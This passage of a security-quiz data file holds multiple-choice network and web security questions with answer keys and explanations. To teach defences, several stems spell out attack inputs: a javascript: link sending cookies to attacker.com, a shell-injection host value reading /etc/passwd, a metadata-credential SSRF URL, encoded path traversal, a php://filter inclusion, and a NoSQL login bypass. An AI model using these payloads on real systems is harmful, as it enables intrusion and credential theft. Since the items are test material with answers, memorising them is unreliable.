      { id: 'opt-a', label: 'A', text: 'Distributing the proxy\'s custom internal Root CA public certificate into the endpoints\' trusted root certificate store.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Exporting the proxy\'s private key to every client endpoint.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Adding static SSH public key mappings to endpoint `/etc/hosts` files.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Purchasing a wildcard SSL certificate from a public CA and binding it to the proxy interface.', isCorrect: false }
    ],
    explanation: 'During forward proxy TLS inspection, the proxy intercepts the outbound handshake, terminates the original TLS session, and generates a dynamic certificate for the requested destination signed by its internal Root CA. Endpoint operating systems must trust this internal Root CA certificate.'
  },

  // 26. Email/network security (Protocol Reasoning) -> Correct Answer: C
  {
    id: 'net-26',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An email arriving from `news@marketing-partner.com` displays `From: support@company.com`. Header analysis reveals:\n- SPF: PASS (`marketing-partner.com` IP 203.0.113.5 authorized)\n- DKIM: PASS (signed by `d=marketing-partner.com`)\n- DMARC: FAIL\nWhy did DMARC fail despite SPF and DKIM passing?',
    options: [
      { id: 'opt-a', label: 'A', text: 'DMARC requires 4096-bit RSA keys for DKIM signatures.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'DMARC automatically rejects emails containing HTML content.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'DMARC domain alignment failed because the domain in the visible From header (`company.com`) did not match the authenticated SPF/DKIM domain (`marketing-partner.com`).', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'The sending mail transfer agent used port 587 instead of port 25.', isCorrect: false }
    ],
    explanation: 'DMARC enforces "Domain Alignment." For DMARC to pass, the domain in the RFC 5322 visible `From` header must match (or align with) the domain verified by SPF (Envelope From) or DKIM (`d=` signature domain). Because `marketing-partner.com` differs from `company.com`, alignment fails.'
  },

  // 27. Cloud network security (Scenario-Based) -> Correct Answer: B
  {
    id: 'net-27',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A Cloud Security Engineer attaches a stateless Network ACL (NACL) to a cloud VPC subnet housing web servers. The engineer adds an inbound rule permitting TCP port 443 from `0.0.0.0/0`, but leaves outbound NACL rules empty (default deny). Why do external HTTPS connections time out?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Cloud Security Groups override NACL rules automatically.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'NACLs are stateless; outbound return traffic from the web server requires an explicit outbound rule allowing response traffic to client ephemeral ports (1024–65535).', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'NACLs operate at Layer 7 and demand TLS termination.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'HTTPS traffic requires GRE tunnel encapsulation across VPC gateways.', isCorrect: false }
    ],
    explanation: 'Unlike stateful Security Groups (which automatically allow return traffic), Network ACLs (NACLs) are stateless. Every packet direction is evaluated independently. Inbound requests on port 443 require an outbound rule allowing return traffic targeting client ephemeral ports (1024-65535).'
  },

  // 28. Wireless network security (Architecture / Design) -> Correct Answer: D
  {
    id: 'net-28',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'WPA3 replaces WPA2-Personal Pre-Shared Keys with Simultaneous Authentication of Equals (SAE) based on the Dragonfly key exchange algorithm. Which vulnerability present in WPA2 is eliminated by SAE?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Rogue AP spoofing using identical SSIDs', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'RADIUS server authentication spoofing', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Physical layer RF jamming on 2.4 GHz bands', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Offline dictionary and brute-force attacks against captured authentication handshakes', isCorrect: true }
    ],
    explanation: 'In WPA2-Personal, capturing the 4-way handshake enables adversaries to perform offline dictionary/brute-force attacks to crack the network PSK. SAE provides forward secrecy and prevents offline dictionary cracking, requiring attackers to interact with the AP for every password guess attempt.'
  },

  // 29. Incident investigation using network evidence (Scenario-Based) -> Correct Answer: B
  {
    id: 'net-29',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'In a PCAP capture of an incident targeting an IIS server, an analyst observes an inbound HTTP POST request to `/assets/uploader.aspx` containing body `cmd=whoami`. The web server\'s HTTP 200 response body contains `nt authority\\network service`. What does this packet sequence confirm?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The IIS web server successfully blocked an arbitrary file upload attempt.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'An attacker successfully executed OS commands via a previously uploaded ASPX web shell.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'A blind SQL injection payload dumped database service account names.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'A client established an outbound reverse shell over TCP port 443.', isCorrect: false }
    ],
    explanation: 'The combination of an HTTP POST request transmitting a command parameter (`cmd=whoami`) to a script file (`uploader.aspx`), and the server returning the executed command output (`nt authority\\network service`) in the HTTP response body proves successful web shell execution.'
  },

  // 30. Defense-in-depth network architecture (Architecture / Design) -> Correct Answer: C
  {
    id: 'net-30',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise designs a multi-tier DMZ topology for a web application relying on a database storing confidential PII data. Which architecture enforces secure defense-in-depth separation?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Place both web and database servers in the DMZ with direct internet interfaces.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Place the database server in the DMZ and the web server in the intranet zone.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Place the web server in the DMZ and the database server in a restricted internal database zone, blocking direct internet access to the database and allowing only specific, authenticated database queries from the web server.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Route all public internet traffic through the database server before reaching the web server.', isCorrect: false }
    ],
    explanation: 'Multi-tier architecture isolates public-facing front-ends (web tier) in the DMZ while placing database systems in isolated internal database segments behind secondary firewall enforcement. Direct internet traffic to the database tier is blocked, and DMZ-to-database access is strictly limited to authorized query ports.'
  },

  // ==========================================
  // 38 HARD / ADVANCED WEB SECURITY QUESTIONS
  // Correct answers are naturally distributed across A, B, C, and D.
  // ==========================================

  // 1. HTTP Request Smuggling (Advanced Web Protocol) -> Correct Answer: A
  {
    id: 'web-1',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise application deployment features a reverse-proxy load balancer forwarding HTTP requests to a back-end Node.js application server. Security monitoring flags that the front-end proxy interprets incoming HTTP requests using the Content-Length header while the back-end application server prioritizes Transfer-Encoding: chunked. An attacker crafts a dual-header HTTP request to poison the back-end socket stream. Which vulnerability does this architectural mismatch represent, and what is the primary mitigation?',
    options: [
      { id: 'opt-a', label: 'A', text: 'HTTP Request Smuggling (CL.TE); mitigated by enforcing HTTP/2 end-to-end or standardizing header parsing rules between front-end and back-end proxies.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Cross-Site Request Forgery (CSRF); mitigated by enforcing SameSite=Strict cookies across all endpoints.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'HTTP Response Splitting; mitigated by stripping carriage-return and line-feed (CRLF) characters from response headers.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Server-Side Request Forgery (SSRF); mitigated by blocking internal loopback IP addresses at the firewall layer.', isCorrect: false }
    ],
    explanation: 'HTTP Request Smuggling occurs when front-end proxies and back-end servers disagree on where HTTP request boundaries end (such as CL.TE or TE.CL discrepancies). Attackers exploit this parsing ambiguity to prepend malicious request prefixes onto the next user\'s request on the reused TCP socket. End-to-end HTTP/2 or strict header normalization remediates the parsing mismatch.'
  },

  // 2. HTTP Strict Transport Security & Preloading (HTTP Headers) -> Correct Answer: C
  {
    id: 'web-2',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A banking institution configures HTTP Strict Transport Security (HSTS) on https://bank.com using the header Strict-Transport-Security: max-age=31536000; includeSubDomains. A user opens a fresh browser with no prior browsing history and types http://subdomain.bank.com while connected to an untrusted public Wi-Fi network where an active attacker is executing ARP spoofing. Why is the user STILL vulnerable to an initial SSL stripping attack during this first request, and what mechanism completely eliminates this initial window?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The browser ignores HSTS headers unless sent over HTTP port 80; the user must manually type https:// every time.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'includeSubDomains only applies to second-level TLDs; the bank must purchase separate SSL certificates for each subdomain.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'The browser\'s first HTTP connection occurs before receiving the HSTS header (Trust-On-First-Use gap); submitting the domain to the browser vendor\'s hardcoded HSTS Preload list eliminates the initial unencrypted connection.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'ARP spoofing bypasses browser HSTS policies by dynamically rewriting DNS A records to point to loopback addresses.', isCorrect: false }
    ],
    explanation: 'HSTS relies on Trust-On-First-Use (TOFU). The first time a browser connects via unencrypted HTTP (http://subdomain.bank.com), an attacker executing SSL stripping can intercept and downgrade the connection before the server can deliver the HSTS header. Hardcoding the domain into the browser vendor\'s HSTS Preload list enforces HTTPS natively on the very first connection before any network request is sent.'
  },

  // 3. Cookie Security Attributes (Cookie Security) -> Correct Answer: B
  {
    id: 'web-3',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An application issues session authentication cookies using the header: Set-Cookie: sessionid=e9a8f23c; Path=/; Secure; HttpOnly; SameSite=Lax. Security auditors test the cookie\'s defense posture against client-side script theft and Cross-Site Request Forgery (CSRF). Which statement accurately describes the security guarantees provided by these cookie attributes?',
    options: [
      { id: 'opt-a', label: 'A', text: 'HttpOnly prevents CSRF attacks, while SameSite=Lax prevents DOM-based XSS attacks from reading document.cookie.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'HttpOnly prevents client-side JavaScript (XSS) from reading document.cookie, while SameSite=Lax blocks automatic cookie transmission on top-level cross-site POST requests and cross-site subresource loads (CSRF protection).', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Secure encrypts the cookie payload in local browser storage, preventing users from viewing their own session token in Developer Tools.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'SameSite=Lax guarantees that cookies are transmitted strictly during cross-origin WebSocket handshakes initiated by third-party iframe elements.', isCorrect: false }
    ],
    explanation: 'HttpOnly instructs the browser that the cookie cannot be accessed via client-side scripts (document.cookie), mitigating session cookie theft via XSS. SameSite=Lax ensures the cookie is withheld on cross-site subresource requests (e.g., images, scripts, cross-site POST forms), providing built-in defense against CSRF for state-changing requests while permitting top-level GET navigations.'
  },

  // 4. Same-Origin Policy Tuple Evaluation (Same-Origin Policy) -> Correct Answer: D
  {
    id: 'web-4',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A web page hosted at https://app.company.com:443/dashboard executes client-side JavaScript that attempts to make a fetch() API request to https://app.company.com:8443/api/v1/metrics. Under the browser\'s Same-Origin Policy (SOP), how is this cross-origin request handled by default?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The browser permits the request without restriction because the domain name (app.company.com) and protocol (https) match exactly.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The browser blocks the request entirely because SOP requires identical URL path prefixes (/dashboard).', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'The browser automatically converts the HTTPS request into a plain HTTP GET request on port 80.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'The browser considers https://app.company.com:8443 a distinct origin due to the non-matching TCP port (8443 vs 443), blocking client script access to the response unless the server explicitly grants cross-origin access via CORS headers.', isCorrect: true }
    ],
    explanation: 'An origin in the Same-Origin Policy is defined strictly by the tuple: (Protocol, Domain, Port). Even if the protocol (https) and domain (app.company.com) match, port 8443 differs from port 443. The browser enforces SOP, treating port 8443 as a different origin and blocking response reading unless the destination server responds with valid CORS headers allowing the request origin.'
  },

  // 5. CORS Credentials Misconfiguration (CORS) -> Correct Answer: B
  {
    id: 'web-5',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An API server configured in Express.js handles cross-origin requests by dynamically reflecting the incoming request\'s Origin header in the response header Access-Control-Allow-Origin: req.header(\'Origin\') and setting Access-Control-Allow-Credentials: true. An attacker hosts a malicious website (https://attacker.com). What specific attack does this CORS misconfiguration enable?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The attacker can execute arbitrary OS shell commands on the API server via HTTP header injection.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Malicious JavaScript running on https://attacker.com can send authenticated cross-origin requests (with victim session cookies attached) to the API and read sensitive authenticated response data.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'The API server is rendered vulnerable to SQL injection because CORS disables parameterized query compilation.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Browsers visiting https://attacker.com will permanently overwrite their DNS cache with the API server\'s IP address.', isCorrect: false }
    ],
    explanation: 'Setting Access-Control-Allow-Credentials: true alongside dynamically reflecting arbitrary request origins (Access-Control-Allow-Origin: attacker.com) effectively bypasses Same-Origin Policy protections. When a victim visits attacker.com, client-side scripts can issue authenticated cross-origin requests with the victim\'s ambient cookies/credentials and read private API responses.'
  },

  // 6. CSRF Synchronizer Token Bypass (CSRF) -> Correct Answer: A
  {
    id: 'web-6',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A financial portal processes wire transfers via POST /api/v1/transfer. An attacker places an invisible form on an external blog that automatically posts transfer parameters to the portal when an authenticated user visits the blog. The portal implements anti-CSRF synchronizer tokens, but an auditor discovers the server checks if req.body.csrf_token exists and matches the session, but silently SKIPS the check if csrf_token is completely omitted from the request body. What is the impact of this implementation error?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The CSRF protection is completely bypassed; the attacker simply omits the csrf_token parameter from their forged form request, causing the server to process the transfer.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'The portal becomes immune to CSRF because missing tokens trigger automatic two-factor authentication.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'The application experiences a Server-Side Request Forgery (SSRF) vulnerability.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'The browser automatically blocks the POST request under the Same-Origin Policy regardless of server code.', isCorrect: false }
    ],
    explanation: 'Anti-CSRF synchronizer token validation must strictly enforce both the presence and valid cryptographic match of the token for every state-changing request. Silently skipping validation when the token parameter is omitted allows attackers to construct forged requests without including the token field, rendering the anti-CSRF mechanism completely ineffective.'
  },

  // 7. Reflected XSS in Script Context (Reflected XSS) -> Correct Answer: C
  {
    id: 'web-7',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A web application reflects a user-supplied search term directly into an inline JavaScript block: <script> var searchTerm = \'USER_INPUT\'; </script>. A developer attempts to prevent Reflected Cross-Site Scripting (XSS) by running USER_INPUT through an HTML entity encoder (converting < to &lt; and > to &gt;). Why does HTML entity encoding fail to prevent XSS in this script context?',
    options: [
      { id: 'opt-a', label: 'A', text: 'HTML entity encoding is deprecated in modern ECMAScript standards.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'HTML entity encoders execute after the JavaScript engine compiles inline script blocks.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'In a JavaScript string context inside <script> tags, an attacker can input \'; alert(document.cookie); // without using < or >, breaking out of the string literal and executing JavaScript because the browser JavaScript engine parses raw script context before HTML entity decoding.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Browsers convert &lt; back into < before executing inline CSS stylesheets.', isCorrect: false }
    ],
    explanation: 'Encoding depends strictly on the output context. HTML entity encoding (&lt;, &gt;) is designed for HTML body/element content. Inside an inline <script> tag, the browser\'s JavaScript engine executes text directly without HTML parsing. An attacker inputs a single quote \' and semicolon ; to terminate the JavaScript variable assignment and inject executable commands, bypassing HTML entity filters. Context-aware JavaScript string escaping or JSON serialization is required.'
  },

  // 8. Stored XSS via Pseudo-Protocol URI (Stored XSS) -> Correct Answer: D
  {
    id: 'web-8',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A social networking web platform allows users to customize their public profile page with markdown and custom hyperlinks. The server uses a rich-text sanitization library that strips <script>, <iframe>, and onload attributes. However, an attacker sets their profile website link to [View Portfolio](javascript:fetch(\'https://attacker.com/steal?c=\'+document.cookie)). What vulnerability exists, and why did the HTML body sanitizer fail?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Reflected XSS; the sanitizer failed because markdown engines compile server code directly to WebAssembly.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'DOM Cloaking; markdown parsers automatically bypass Same-Origin Policy.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'SQL Injection; link target attributes execute database queries upon hover.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Stored XSS via pseudo-protocol URI; the sanitizer filtered dangerous HTML tags but failed to validate or sanitize attribute URL schemes, allowing the javascript: pseudo-protocol in the href attribute.', isCorrect: true }
    ],
    explanation: 'HTML sanitization must validate both HTML tag structures and attribute values (such as href and src). Allowing unvalidated URL schemes permits the javascript: pseudo-protocol inside anchor href attributes. When other users click the hyperlink, the browser executes the inline JavaScript in the context of the user\'s authenticated session, leading to Stored XSS.'
  },

  // 9. DOM-based XSS via Client-Side Sinks (DOM-based XSS) -> Correct Answer: B
  {
    id: 'web-9',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A Single Page Application (SPA) extracts parameters from the browser URL fragment (window.location.hash) and updates the user dashboard using the client-side code: document.getElementById(\'welcome-msg\').innerHTML = \'Welcome \' + decodeURIComponent(location.hash.substring(1));. An attacker sends a victim a link: https://app.com/dashboard#<img src=x onerror=alert(document.domain)>. What type of vulnerability is present, and why?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Server-Side Template Injection (SSTI); because the server compiles the hash fragment before sending HTML.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'DOM-based Cross-Site Scripting (DOM XSS); because untrusted user data from a client-side source (location.hash) is passed directly to an unsafe DOM sink (innerHTML) without client-side sanitization.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Reflected XSS; because URL fragments are transmitted to the web server inside HTTP request headers.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Cross-Origin Resource Sharing (CORS) bypass; because the hash character forces the browser to disable HTTPS certificate validation.', isCorrect: false }
    ],
    explanation: 'DOM-based XSS occurs entirely within the client-side browser DOM. URL hash fragments (#...) are never transmitted to the server in HTTP requests. The client JavaScript reads data from an untrusted client source (location.hash) and writes it directly to an execution sink (innerHTML). Remediation requires using safe text sinks (textContent or innerText) or client-side DOM sanitization libraries.'
  },

  // 10. CSP Nonce and Strict-Dynamic (Content Security Policy) -> Correct Answer: A
  {
    id: 'web-10',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise website deploys a Content Security Policy (CSP) header: Content-Security-Policy: default-src \'self\'; script-src \'self\' https://cdn.jsdelivr.net. Security auditors demonstrate that an attacker can bypass this CSP and execute arbitrary JavaScript by leveraging an open JSONP endpoint hosted on cdn.jsdelivr.net or crafting a script payload hosted on the public CDN. Which CSP refactoring best mitigates this script source wildcard vulnerability?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Transition to a cryptographic nonce-based CSP (script-src \'nonce-rAnd0m123\' \'strict-dynamic\'), invalidating un-nonced inline scripts and CDN endpoints while permitting trusted scripts to load dependencies dynamically.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Add \'unsafe-inline\' to the script-src directive to force strict domain checking.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Replace the HTTP header with a <meta> tag containing script-src *.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Convert all client-side JavaScript files into inline CSS keyframe animations.', isCorrect: false }
    ],
    explanation: 'Domain-based CSP allowlists (such as allowing an entire public CDN or domain hosting JSONP endpoints) are vulnerable to CSP bypasses because attackers can re-use hosted libraries or JSONP callbacks on the allowed domain to execute arbitrary script code. Adopting cryptographic nonces (\'nonce-...\') combined with \'strict-dynamic\' ensures only explicitly nonced script elements generated by the server execute, rendering domain wildcards obsolete.'
  },

  // 11. Clickjacking Defenses & Frame Ancestors (Clickjacking) -> Correct Answer: C
  {
    id: 'web-11',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An attacker creates a web page that loads a target web application\'s sensitive fund transfer portal inside a transparent <iframe> styled with opacity: 0. The attacker overlays an appealing online game with a large "Play Game" button directly above the hidden portal\'s "Confirm Wire Transfer" button. When the user clicks "Play Game", they unwittingly authorize a financial transaction. What defense explicitly prevents this Clickjacking (UI Redress) attack?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Enforcing 256-bit AES encryption on all outbound REST API response bodies.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Adding Access-Control-Allow-Origin: * to HTTP response headers.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Returning the HTTP header Content-Security-Policy: frame-ancestors \'none\' (or X-Frame-Options: DENY), restricting browsers from rendering the page inside any <iframe>.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Requiring users to solve a CAPTCHA before loading client-side CSS stylesheets.', isCorrect: false }
    ],
    explanation: 'Clickjacking relies on embedding a target application inside an <iframe> on an attacker-controlled site and tricking users into clicking invisible UI elements. The frame-ancestors directive in CSP (and legacy X-Frame-Options) instructs the browser whether the current page may be embedded in <frame>, <iframe>, <embed>, or <object> elements, completely blocking framing when set to \'none\' or \'self\'.'
  },

  // 12. Parameterized Queries vs String Concatenation (SQL Injection) -> Correct Answer: B
  {
    id: 'web-12',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A developer writes a database lookup routine in Node.js: db.query("SELECT * FROM users WHERE status = \'" + req.query.status + "\'"). An attacker submits status=active\' OR \'1\'=\'1. To fix this SQL Injection vulnerability, the developer replaces the code with: db.query("SELECT * FROM users WHERE status = $1", [req.query.status]). Why does the parameterized query (prepared statement) guarantee immunity against SQL injection?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Parameterized queries encrypt the input string using the database server\'s public TLS key before execution.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Parameterized queries separate query code compilation from user data evaluation; the database engine parses the SQL command structure first, treating user parameters strictly as literal data constants regardless of special syntax characters.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Parameterized queries force the web application server to validate that inputs contain only alphanumeric characters.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Parameterized queries execute the SQL statement in a client-side sandbox inside the user\'s browser.', isCorrect: false }
    ],
    explanation: 'SQL Injection occurs when untrusted data alters the AST (Abstract Syntax Tree) intent of a database query. Parameterized queries pre-compile the SQL code structure on the database engine first. When parameters are bound afterwards, the database engine treats parameter values strictly as literal scalar data, rendering meta-characters (like single quotes or OR 1=1) completely harmless data strings rather than executable SQL syntax.'
  },

  // 13. MongoDB Operator Injection (NoSQL Injection) -> Correct Answer: D
  {
    id: 'web-13',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A web application uses Node.js with MongoDB and Mongoose. The login handler accepts a JSON body directly into the database query: db.collection(\'users\').findOne({ username: req.body.username, password: req.body.password }). An attacker sends an HTTP POST request with payload {"username": "admin", "password": {"$gt": ""}}. What happens during query execution, and how is it mitigated?',
    options: [
      { id: 'opt-a', label: 'A', text: 'MongoDB rejects the query because $gt is a reserved SQL keyword.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The query fails with a syntax error, causing an immediate denial of service on the database cluster.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'The express JSON parser strips object parameters and replaces them with null strings.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'The $gt (greater than) operator matches any non-empty password string, bypassing password authentication; mitigated by sanitizing query inputs to ensure parameters are strict strings rather than nested query objects.', isCorrect: true }
    ],
    explanation: 'NoSQL Injection occurs when query engines accept structured objects (like MongoDB query operators $gt, $ne, $regex) inside untrusted user parameters. Submitting {"$gt": ""} evaluates to "password is greater than empty string", returning the admin user document and bypassing password verification. Sanitizing input types (e.g. enforcing string types) or using schema validation prevents object injection.'
  },

  // 14. Command Injection & Shell Parsing (Command Injection) -> Correct Answer: A
  {
    id: 'web-14',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A network diagnostic web tool executes ping checks by calling a system shell: exec("ping -c 1 " + req.body.host). An attacker submits host = "8.8.8.8; cat /etc/passwd". The server returns system account files in the HTTP response. Which architectural refactoring directly eliminates Command Injection while preserving ping functionality?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Replace shell execution (exec()) with parameterized process invocation (execFile() or spawn()) passing arguments in a discrete string array without invoking an underlying shell interpreter, or use native API libraries.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Strip spaces from req.body.host using regex replacement before calling exec().', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Encode req.body.host using URL encoding (encodeURIComponent) before passing it to exec().', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Run the Node.js process using sudo privileges to restrict file access.', isCorrect: false }
    ],
    explanation: 'Passing concatenated strings to functions like child_process.exec() spawns an operating system shell (e.g., /bin/sh), which interprets shell metacharacters (;, |, &, $). Switching to execFile() or spawn() invokes the target binary directly, passing arguments as discrete array elements without invoking a command shell interpreter, eliminating shell metacharacter parsing.'
  },

  // 15. SSRF & Cloud Metadata Protection (SSRF) -> Correct Answer: C
  {
    id: 'web-15',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An image-resizing web microservice accepts a URL parameter GET /resize?url=https://example.com/photo.jpg and fetches the remote asset on behalf of the user. An attacker supplies url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. The application returns secret AWS temporary IAM credentials attached to the cloud instance. Which vulnerability is present, and what is the strongest defense against cloud metadata exfiltration?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Reflected XSS; mitigated by setting HttpOnly on session cookies.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Cross-Site Request Forgery (CSRF); mitigated by enforcing SameSite cookie attributes.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Server-Side Request Forgery (SSRF); mitigated by enforcing strict URL scheme/domain allowlists, blocking requests to internal/loopback/link-local IP addresses (including 169.254.169.254), and enforcing AWS IMDSv2 (session token-based metadata access).', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Path Traversal; mitigated by stripping ../ sequences from the URL parameter.', isCorrect: false }
    ],
    explanation: 'Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource specified by the user without validating the destination address, allowing attackers to target internal microservices or cloud instance metadata endpoints (169.254.169.254). Enforcing IMDSv2 (which requires a PUT header token unavailable in basic SSRF relays) alongside IP/domain allowlists and egress restrictions prevents metadata theft.'
  },

  // 16. Path Traversal & Canonicalization (Path Traversal) -> Correct Answer: B
  {
    id: 'web-16',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A document portal allows users to download reports via GET /download?file=annual_report.pdf. The backend sanitizes the parameter by stripping literal ../ string sequences. An attacker bypasses the filter by requesting GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd. Why did the path traversal filter fail, and how should file access be securely designed?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The attack succeeded because Linux operating systems execute PDF files automatically; mitigated by converting all files to plain text.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The filter failed because of nested or double URL decoding performed by web frameworks after sanitization; mitigated by resolving path canonicalization (path.resolve), validating that the canonical path stays within the base directory, or using indirect file IDs mapped in a database.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'The attack succeeded because the server lacked an SSL/TLS certificate; mitigated by enforcing HTTPS on download routes.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'The filter failed because URL parameters cannot be sanitized in HTTP GET requests; mitigated by converting the endpoint to HTTP OPTIONS.', isCorrect: false }
    ],
    explanation: 'Simple string replacement filters (like stripping ../) fail against nested or double-encoded traversal sequences (%252e%252e%252f decodes to %2e%2e%2f and then ../). Robust path traversal defense requires resolving the absolute canonical path (e.g. path.resolve()) and verifying it strictly starts with the intended base directory prefix, or avoiding direct filename parameters entirely by referencing file records via database-generated UUIDs.'
  },

  // 17. Local File Inclusion Stream Wrappers (File Inclusion) -> Correct Answer: D
  {
    id: 'web-17',
    categoryId: 'web',
    category: 'WEB SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A legacy web platform built in PHP renders dynamic pages using the statement include($_GET[\'template\']);. An attacker submits a request: GET /index.php?template=php://filter/read=convert.base64-encode/resource=config.php. The server returns the base64-encoded source code of config.php, exposing database credentials. What vulnerability class is exploited, and what is its root cause?',
    options: [
      { id: 'opt-a', label: 'A', text: 'DOM-based XSS caused by client-side document write calls.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Insecure Direct Object Reference (IDOR) caused by missing user authorization checks on REST APIs.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Command Injection caused by passing unescaped strings to system shell execution wrappers.', isCorrect: false },
